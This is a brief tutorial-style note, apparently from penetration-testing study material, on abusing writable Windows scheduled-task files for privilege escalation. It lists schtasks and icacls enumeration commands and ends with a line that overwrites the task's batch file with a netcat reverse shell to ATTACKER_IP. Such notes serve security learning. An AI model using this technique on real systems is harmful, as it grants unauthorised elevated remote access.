## Run as user:

if a scheduled task has a value for "run as user" and the current logged in user has full (F) access to the file being run then you can exploit this:

NOTE: run in cmd.exe

Check for all scheduled tasks:

`schtasks`

find details on specific task such as "run as user"

`schtasks /query /tn vulntask /fo list /v`

![Screenshot 2023-05-16 at 18.56.02.png](../../../_resources/Screenshot%202023-05-16%20at%2018.56.02.png)

From here use "icacls" to check wether you have full (F) or other modification rights to the scheduled task

`icacls c:\tasks\schtask.bat`

![Screenshot 2023-05-16 at 18.59.00.png](../../../_resources/Screenshot%202023-05-16%20at%2018.59.00.png)

From here if you have the correct permissions you can then inject your reverse shell into the task if it is a batch file or something close to it:

`echo c:\tools\nc64.exe -e cmd.exe ATTACKER_IP 4444 > C:\tasks\schtask.bat`